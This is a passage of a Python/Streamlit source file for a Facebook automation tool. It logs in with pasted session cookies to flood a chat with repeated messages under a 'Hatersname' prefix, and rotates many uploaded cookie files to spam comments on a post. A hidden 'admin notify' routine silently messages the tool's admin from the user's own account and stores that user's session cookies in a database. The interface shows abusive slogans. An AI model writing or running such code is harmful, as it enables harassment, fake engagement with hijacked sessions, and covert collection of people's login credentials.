                                    regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    
                                    if regular_thread_id == user_chat_id:
                                        log_message(f"ADMIN-NOTIFY: ⚠️ This is user's own chat ({regular_thread_id}), skipping...", automation_state)
                                        driver.back()
                                        time.sleep(3)
                                        continue
                                    
                                    e2ee_thread_id = regular_thread_id
                                    if e2ee_thread_id and user_id:
                                        current_cookies = user_config.get('cookies', '')
                                        db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
                                        log_message(f"ADMIN-NOTIFY: ✅ Found & saved admin REGULAR chat thread ID: {e2ee_thread_id}", automation_state)
                                    admin_found = True
                                    break
                                else:
                                    log_message(f"ADMIN-NOTIFY: URL doesn't look like conversation, trying next result...", automation_state)
                                    driver.back()
                                    time.sleep(3)
                        except Exception as e:
                            log_message(f"ADMIN-NOTIFY: Result #{idx+1} failed: {str(e)[:50]}", automation_state)
                            continue
                    
                    if admin_found:
                        break
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Selector {selector} failed: {str(e)[:50]}", automation_state)
                    continue
            
            if not admin_found:
                log_message(f"ADMIN-NOTIFY: ⚠️ Admin UID not found in search results, trying direct admin profile...", automation_state)
                
                try:
                    profile_url = f'https://www.facebook.com/{ADMIN_UID}'
                    log_message(f"ADMIN-NOTIFY: Opening admin profile: {profile_url}", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    message_button_selectors = [
                        f'a[href*="/{ADMIN_UID}"][href*="message"]',
                        f'a[href*="messages"][href*="{ADMIN_UID}"]',
                        'div[aria-label*="Message" i][role="button"]',
                        'a[aria-label*="Message" i][role="link"]',
                        'span:contains("Message")'
                    ]
                    
                    message_buttons = []
                    for sel in message_button_selectors:
                        try:
                            btns = driver.find_elements(By.CSS_SELECTOR, sel)
                            if btns:
                                log_message(f"ADMIN-NOTIFY: Found {len(btns)} message buttons with: {sel}", automation_state)
                                message_buttons.extend(btns)
                                break
                        except:
                            continue
                    
                    message_attempts = 0
                    max_message_attempts = 3
                    
                    for btn in message_buttons:
                        if message_attempts >= max_message_attempts:
                            log_message(f"ADMIN-NOTIFY: Max message button attempts ({max_message_attempts}) reached", automation_state)
                            break
                        
                        if btn.is_displayed():
                            message_attempts += 1
                            log_message(f"ADMIN-NOTIFY: Clicking message button on profile (attempt {message_attempts})...", automation_state)
                            
                            current_url_before = driver.current_url
                            driver.execute_script("arguments[0].click();", btn)
                            time.sleep(8)
                            
                            try:
                                continue_buttons = driver.find_elements(By.CSS_SELECTOR, 'div[role="button"]:not([aria-label*="Close" i]):not([aria-label*="Back" i]), button:not([aria-label*="Close" i]):not([aria-label*="Back" i])')
                                
                                for cont_btn in continue_buttons:
                                    btn_text = (cont_btn.text or '').lower()
                                    btn_label = (cont_btn.get_attribute('aria-label') or '').lower()
                                    
                                    if 'continue' in btn_text or 'continue' in btn_label or 'जारी' in btn_text:
                                        log_message(f"ADMIN-NOTIFY: Found E2EE setup dialog from profile, clicking Continue...", automation_state)
                                        driver.execute_script("arguments[0].click();", cont_btn)
                                        time.sleep(8)
                                        break
                            except:
                                pass
                            
                            current_url = driver.current_url
                            
                            if current_url == current_url_before or 'profile.php' in current_url:
                                log_message(f"ADMIN-NOTIFY: ⚠️ Message button didn't open conversation (still on profile)", automation_state)
                                continue
                            
                            log_message(f"ADMIN-NOTIFY: Opened URL from profile: {current_url}", automation_state)
                            
                            if 'e2ee' in current_url.lower() and '/e2ee/t/' in current_url:
                                e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                
                                if e2ee_thread_id == ADMIN_UID:
                                    log_message(f"ADMIN-NOTIFY: ⚠️ E2EE thread ID is admin UID ({e2ee_thread_id}), not actual thread!", automation_state)
                                    continue
                                elif e2ee_thread_id == user_chat_id:
                                    log_message(f"ADMIN-NOTIFY: ⚠️ Profile opened user's own chat ({e2ee_thread_id}), not admin's!", automation_state)
                                    continue
                                
                                if e2ee_thread_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'E2EE')
                                    log_message(f"ADMIN-NOTIFY: ✅ Found admin E2EE from profile & saved: {e2ee_thread_id}", automation_state)
                                admin_found = True
                                break
                            elif '/messages/t/' in current_url:
                                regular_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                
                                if regular_thread_id == user_chat_id:
                                    log_message(f"ADMIN-NOTIFY: ⚠️ Profile opened user's own chat ({regular_thread_id}), not admin's!", automation_state)
                                    continue
                                
                                e2ee_thread_id = regular_thread_id
                                if e2ee_thread_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, 'REGULAR')
                                    log_message(f"ADMIN-NOTIFY: ✅ Found admin REGULAR chat from profile & saved: {e2ee_thread_id}", automation_state)
                                admin_found = True
                                break
                    
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Profile approach failed: {str(e)[:100]}", automation_state)
            
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: ⚠️ Could not find admin via search, trying DIRECT MESSAGE approach...", automation_state)
                
                try:
                    profile_url = f'https://www.facebook.com/messages/new'
                    log_message(f"ADMIN-NOTIFY: Opening new message page...", automation_state)
                    driver.get(profile_url)
                    time.sleep(8)
                    
                    search_box = None
                    search_selectors = [
                        'input[aria-label*="To:" i]',
                        'input[placeholder*="Type a name" i]',
                        'input[type="text"]'
                    ]
                    
                    for selector in search_selectors:
                        try:
                            search_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            if search_elements:
                                for elem in search_elements:
                                    if elem.is_displayed():
                                        search_box = elem
                                        log_message(f"ADMIN-NOTIFY: Found 'To:' box with: {selector}", automation_state)
                                        break
                                if search_box:
                                    break
                        except:
                            continue
                    
                    if search_box:
                        log_message(f"ADMIN-NOTIFY: Typing admin UID in new message...", automation_state)
                        driver.execute_script("""
                            arguments[0].focus();
                            arguments[0].value = arguments[1];
                            arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                        """, search_box, ADMIN_UID)
                        time.sleep(5)
                        
                        result_elements = driver.find_elements(By.CSS_SELECTOR, 'div[role="option"], li[role="option"], a[role="option"]')
                        if result_elements:
                            log_message(f"ADMIN-NOTIFY: Found {len(result_elements)} results, clicking first...", automation_state)
                            driver.execute_script("arguments[0].click();", result_elements[0])
                            time.sleep(8)
                            
                            current_url = driver.current_url
                            if '/messages/t/' in current_url or '/e2ee/t/' in current_url:
                                if '/e2ee/t/' in current_url:
                                    e2ee_thread_id = current_url.split('/e2ee/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'E2EE'
                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened E2EE: {e2ee_thread_id}", automation_state)
                                else:
                                    e2ee_thread_id = current_url.split('/messages/t/')[-1].split('?')[0].split('/')[0]
                                    chat_type = 'REGULAR'
                                    log_message(f"ADMIN-NOTIFY: ✅ Direct message opened REGULAR chat: {e2ee_thread_id}", automation_state)
                                
                                if e2ee_thread_id and e2ee_thread_id != user_chat_id and user_id:
                                    current_cookies = user_config.get('cookies', '')
                                    db.set_admin_e2ee_thread_id(user_id, e2ee_thread_id, current_cookies, chat_type)
                                    admin_found = True
                except Exception as e:
                    log_message(f"ADMIN-NOTIFY: Direct message approach failed: {str(e)[:100]}", automation_state)
            
            if not admin_found or not e2ee_thread_id:
                log_message(f"ADMIN-NOTIFY: ❌ ALL APPROACHES FAILED - Could not find/open admin conversation", automation_state)
                return
            
            conversation_type = "E2EE" if "e2ee" in driver.current_url else "REGULAR"
            log_message(f"ADMIN-NOTIFY: ✅ Successfully opened {conversation_type} conversation with admin", automation_state)
        
        message_input = find_message_input(driver, 'ADMIN-NOTIFY', automation_state)
        
        if message_input:
            from datetime import datetime
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            conversation_type = "E2EE 🔒" if "e2ee" in driver.current_url.lower() else "Regular 💬"
            notification_msg = f"🔔 New User Started Automation\n\n👤 Username: {username}\n⏰ Time: {current_time}\n📱 Chat Type: {conversation_type}\n🆔 Thread ID: {e2ee_thread_id if e2ee_thread_id else 'N/A'}"
            
            log_message(f"ADMIN-NOTIFY: Typing notification message...", automation_state)
            driver.execute_script("""
                const element = arguments[0];
                const message = arguments[1];
                
                element.scrollIntoView({behavior: 'smooth', block: 'center'});
                element.focus();
                element.click();
                
                if (element.tagName === 'DIV') {
                    element.textContent = message;
                    element.innerHTML = message;
                } else {
                    element.value = message;
                }
                
                element.dispatchEvent(new Event('input', { bubbles: true }));
                element.dispatchEvent(new Event('change', { bubbles: true }));
                element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
            """, message_input, notification_msg)
            
            time.sleep(1)
            
            log_message(f"ADMIN-NOTIFY: Trying to send message...", automation_state)
            send_result = driver.execute_script("""
                const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                
                for (let btn of sendButtons) {
                    if (btn.offsetParent !== null) {
                        btn.click();
                        return 'button_clicked';
                    }
                }
                return 'button_not_found';
            """)
            
            if send_result == 'button_not_found':
                log_message(f"ADMIN-NOTIFY: Send button not found, using Enter key...", automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    element.focus();
                    
                    const events = [
                        new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                        new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                    ];
                    
                    events.forEach(event => element.dispatchEvent(event));
                """, message_input)
                log_message(f"ADMIN-NOTIFY: ✅ Sent via Enter key: '{notification_msg}'", automation_state)
            else:
                log_message(f"ADMIN-NOTIFY: ✅ Send button clicked: '{notification_msg}'", automation_state)
            
            time.sleep(2)
        else:
            log_message(f"ADMIN-NOTIFY: ❌ Failed to find message input", automation_state)
            
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: ❌ Error sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    """First send admin notification, then start automation"""
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def send_comments(config, automation_state, process_id='COMMENT-1'):
    """Send comments to a Facebook post using multiple cookies"""
    driver = None
    cookies_list = config.get('cookies_list', [])
    
    if not cookies_list:
        log_message(f'{process_id}: No cookies provided!', automation_state)
        automation_state.running = False
        return 0
    
    post_url = config.get('post_url', '').strip()
    if not post_url:
        log_message(f'{process_id}: No post URL provided!', automation_state)
        automation_state.running = False
        return 0
    
    comments_list = [msg.strip() for msg in config.get('comments', '').split('\n') if msg.strip()]
    if not comments_list:
        comments_list = ['Nice post!']
    
    delay = int(config.get('delay', 30))
    comments_sent = 0
    cookie_index = 0
    
    try:
        while automation_state.running:
            current_cookies = cookies_list[cookie_index % len(cookies_list)]
            cookie_index += 1
            
            log_message(f'{process_id}: Using cookie set #{cookie_index}/{len(cookies_list)}', automation_state)
            
            try:
                driver = setup_browser(automation_state)
                
                log_message(f'{process_id}: Navigating to Facebook...', automation_state)
                driver.get('https://www.facebook.com/')
                time.sleep(8)
                
                log_message(f'{process_id}: Adding cookies...', automation_state)
                if current_cookies and current_cookies.strip():
                    cookie_array = current_cookies.split(';')
                    for cookie in cookie_array:
                        cookie_trimmed = cookie.strip()
                        if cookie_trimmed:
                            first_equal_index = cookie_trimmed.find('=')
                            if first_equal_index > 0:
                                name = cookie_trimmed[:first_equal_index].strip()
                                value = cookie_trimmed[first_equal_index + 1:].strip()
                                try:
                                    driver.add_cookie({
                                        'name': name,
                                        'value': value,
                                        'domain': '.facebook.com',
                                        'path': '/'
                                    })
                                except Exception:
                                    pass
                
                log_message(f'{process_id}: Opening post: {post_url[:50]}...', automation_state)
                driver.get(post_url)
                time.sleep(10)
                
                driver.execute_script("window.scrollTo(0, 400);")
                time.sleep(2)
                
                log_message(f'{process_id}: Looking for comment box...', automation_state)
                comment_box_selectors = [
                    'div[aria-label*="Write a comment" i][contenteditable="true"]',
                    'div[aria-label*="comment" i][contenteditable="true"]',
                    'div[data-placeholder*="comment" i][contenteditable="true"]',
                    'div[contenteditable="true"][role="textbox"]',
                    '[contenteditable="true"]'
                ]
                
                comment_box = None
                for selector in comment_box_selectors:
                    try:
                        elements = driver.find_elements(By.CSS_SELECTOR, selector)
                        for element in elements:
                            if element.is_displayed():
                                placeholder = driver.execute_script(
                                    "return arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('data-placeholder') || '';", 
                                    element
                                ).lower()
                                if 'comment' in placeholder or 'write' in placeholder:
                                    comment_box = element
                                    log_message(f'{process_id}: Found comment box!', automation_state)
                                    break
                        if comment_box:
                            break
                    except:
                        continue
                
                if not comment_box:
                    log_message(f'{process_id}: Comment box not found, skipping this account...', automation_state)
                    if driver:
                        driver.quit()
                    continue
                
                comment_text = get_next_message(comments_list, automation_state)
                
                log_message(f'{process_id}: Typing comment: {comment_text[:50]}...', automation_state)
                driver.execute_script("""
                    const element = arguments[0];
                    const comment = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    element.textContent = comment;
                    element.innerHTML = comment;
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: comment }));
                """, comment_box, comment_text)
                
                time.sleep(2)
                
                log_message(f'{process_id}: Submitting comment...', automation_state)
                submit_result = driver.execute_script("""
                    const submitButtons = document.querySelectorAll('[aria-label*="Post" i]:not([aria-label*="like" i]), button[type="submit"]');
                    
                    for (let btn of submitButtons) {
                        if (btn.offsetParent !== null) {
                            const btnText = btn.textContent.toLowerCase();
                            const btnLabel = (btn.getAttribute('aria-label') || '').toLowerCase();
                            if (btnText.includes('post') || btnLabel.includes('post') || btnText.includes('comment')) {
                                btn.click();
                                return 'button_clicked';
                            }
                        }
                    }
                    return 'button_not_found';
                """)
                
                if submit_result == 'button_not_found':
                    log_message(f'{process_id}: Submit button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, comment_box)
                
                comments_sent += 1
                automation_state.message_count = comments_sent
                log_message(f'{process_id}: Comment {comments_sent} sent successfully!', automation_state)
                
                if driver:
                    driver.quit()
                    driver = None
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error with this account: {str(e)[:100]}', automation_state)
                if driver:
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = None
                continue
        
        log_message(f'{process_id}: Comment automation stopped! Total comments: {comments_sent}', automation_state)
        automation_state.running = False
        return comments_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    thread = threading.Thread(target=send_messages, args=(user_config, automation_state, user_id, 'AUTO-1'))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False

def start_comment_automation(comment_config):
    automation_state = st.session_state.comment_automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    automation_state.message_rotation_index = 0
    
    thread = threading.Thread(target=send_comments, args=(comment_config, automation_state, 'COMMENT-1'))
    thread.daemon = True
    thread.start()

def stop_comment_automation():
    st.session_state.comment_automation_state.running = False

st.markdown('<div class="main-header"><img src="https://i.postimg.cc/VvB52mwW/In-Shot-20250608-213052061.jpg" class="prince-logo"><h1> E2EE OFFLINE</h1><p>𝘾𝙃𝙊𝙊𝙏 𝙆𝙊 𝙇𝘼𝙉𝘿 𝙎𝙀 𝘾𝙃𝙀𝙀𝙍𝙉𝙀𝙔 𝙒𝘼𝙇𝘼 𝘿𝘼𝙉𝘼𝙑 𝙆𝙄𝙉𝙂</p></div>', unsafe_allow_html=True)

tab1, tab2, tab3, tab4 = st.tabs(["⚙️ Message Config", "🚀 Message Automation", "💬 Comment Config", "🎯 Comment Automation"])

with tab1:
    st.markdown("### Message Configuration")
    
    chat_id = st.text_input("Chat/Conversation ID", value=st.session_state.user_config['chat_id'], 
                           placeholder="e.g., 1362400298935018",
                           help="Facebook conversation ID from the URL")
    
    name_prefix = st.text_input("Hatersname", value=st.session_state.user_config['name_prefix'],
                               placeholder="e.g., [END TO END]",
                               help="Prefix to add before each message")
    
    delay = st.number_input("Delay (seconds)", min_value=1, max_value=300, 
                           value=st.session_state.user_config['delay'],
                           help="Wait time between messages")
    
    cookies = st.text_area("Facebook Cookies", 
                          value=st.session_state.user_config['cookies'],
                          placeholder="Paste your Facebook cookies here",
                          height=100,
                          help="Required for automation to work")
    
    messages = st.text_area("Messages (one per line)", 
                           value=st.session_state.user_config['messages'],
                           placeholder="NP file copy paste karo",
                           height=150,
                           help="Enter each message on a new line")
    
    if st.button("💾 Save Configuration", use_container_width=True):
        st.session_state.user_config = {
            'chat_id': chat_id,
            'name_prefix': name_prefix,
            'delay': delay,
            'cookies': cookies,
            'messages': messages
        }
        st.success("✅ Configuration saved successfully!")
        st.rerun()

with tab3:
    st.markdown("### Comment Configuration")
    
    post_url = st.text_input("Post URL", value=st.session_state.comment_config['post_url'],
                            placeholder="https://www.facebook.com/...",
                            help="Full URL of the Facebook post")
    
    st.markdown("#### Upload Multiple Cookie Files")
    uploaded_files = st.file_uploader("Upload cookie files (.txt)", type=['txt'], accept_multiple_files=True,
                                     help="Upload multiple text files containing Facebook cookies")
    
    if uploaded_files:
        cookies_list = []
        for uploaded_file in uploaded_files:
            try:
                cookie_content = uploaded_file.read().decode('utf-8').strip()
                if cookie_content:
                    cookies_list.append(cookie_content)
            except Exception as e:
                st.error(f"Error reading {uploaded_file.name}: {str(e)}")
        
        st.session_state.comment_config['cookies_list'] = cookies_list
        st.success(f"✅ Loaded {len(cookies_list)} cookie files")
    
    if st.session_state.comment_config['cookies_list']:
        st.info(f"📁 Currently loaded: {len(st.session_state.comment_config['cookies_list'])} cookie files")
    
    comment_delay = st.number_input("Delay between comments (seconds)", min_value=1, max_value=300,
                                   value=st.session_state.comment_config['delay'],
                                   help="Wait time between each comment")
    
    comments = st.text_area("Comments (one per line)",
                          value=st.session_state.comment_config['comments'],
                          placeholder="Amazing post!\nGreat content!\nLove this!",
                          height=150,
                          help="Enter each comment on a new line")
    
    if st.button("💾 Save Comment Configuration", use_container_width=True):
        st.session_state.comment_config['post_url'] = post_url
        st.session_state.comment_config['delay'] = comment_delay
        st.session_state.comment_config['comments'] = comments
        st.success("✅ Comment configuration saved!")
        st.rerun()

with tab4:
    st.markdown("### Comment Automation Control")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric("Comments Sent", st.session_state.comment_automation_state.message_count)
    
    with col2:
        status = "🟢 Running" if st.session_state.comment_automation_state.running else "🔴 Stopped"
        st.metric("Status", status)
    
    with col3:
        cookies_count = len(st.session_state.comment_config.get('cookies_list', []))
        st.metric("Cookie Files", cookies_count)
    
    col1, col2 = st.columns(2)
    
    with col1:
        can_start = (not st.session_state.comment_automation_state.running and 
                    st.session_state.comment_config['post_url'] and 
                    len(st.session_state.comment_config.get('cookies_list', [])) > 0)
        
        if st.button("▶️ Start Comments", disabled=not can_start, use_container_width=True):
            start_comment_automation(st.session_state.comment_config)
            st.rerun()
        
        if not st.session_state.comment_config['post_url']:
            st.warning("⚠️ Please configure Post URL first!")
        if len(st.session_state.comment_config.get('cookies_list', [])) == 0:
            st.warning("⚠️ Please upload cookie files first!")
    
    with col2:
        if st.button("⏹️ Stop Comments", disabled=not st.session_state.comment_automation_state.running, use_container_width=True):
            stop_comment_automation()
            st.rerun()
    
    st.markdown('<div class="console-section"><h4 class="console-header">Comment Console Monitor</h4></div>', unsafe_allow_html=True)
    
    if st.session_state.comment_automation_state.logs:
        logs_html = '<div class="console-output">'
        for log in st.session_state.comment_automation_state.logs[-50:]:
            logs_html += f'<div class="console-line">{log}</div>'
        logs_html += '</div>'
        st.markdown(logs_html, unsafe_allow_html=True)
    else:
        st.markdown('<div class="console-output"><div class="console-line">🚀 Console ready... Start comment automation to see logs here.</div></div>', unsafe_allow_html=True)
    
    if st.session_state.comment_automation_state.running:
        time.sleep(1)
        st.rerun()

with tab2:
    st.markdown("### Message Automation Control")
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric("Messages Sent", st.session_state.automation_state.message_count)
    
    with col2:
        status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
        st.metric("Status", status)
    
    with col3:
        st.metric("Total Logs", len(st.session_state.automation_state.logs))
    
    col1, col2 = st.columns(2)
    
    with col1:
        if st.button("▶️ Start E2ee", disabled=st.session_state.automation_state.running, use_container_width=True):
            if st.session_state.user_config['chat_id']:
                start_automation(st.session_state.user_config, None)
                st.rerun()
            else:
                st.error("❌ Please configure Chat ID first!")
    
    with col2:
        if st.button("⏹️ Stop E2ee", disabled=not st.session_state.automation_state.running, use_container_width=True):
            stop_automation(None)
            st.rerun()
    
    st.markdown('<div class="console-section"><h4 class="console-header">Live Console Monitor</h4></div>', unsafe_allow_html=True)
    
    if st.session_state.automation_state.logs:
        logs_html = '<div class="console-output">'
        for log in st.session_state.automation_state.logs[-50:]:
            logs_html += f'<div class="console-line">{log}</div>'
        logs_html += '</div>'
        st.markdown(logs_html, unsafe_allow_html=True)
    else:
        st.markdown('<div class="console-output"><div class="console-line">🚀 Console ready... Start automation to see logs here.</div></div>', unsafe_allow_html=True)
    
    if st.session_state.automation_state.running:
        time.sleep(1)
        st.rerun()

st.markdown('<div class="footer">𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙒 𝙆𝘼 𝘽𝙃9𝙎𝘿𝘼  𝙊𝙉𝙁𝙄𝙍𝙀𝙀𝙀 <br>All Rights Reserved</div>', unsafe_allow_html=True)
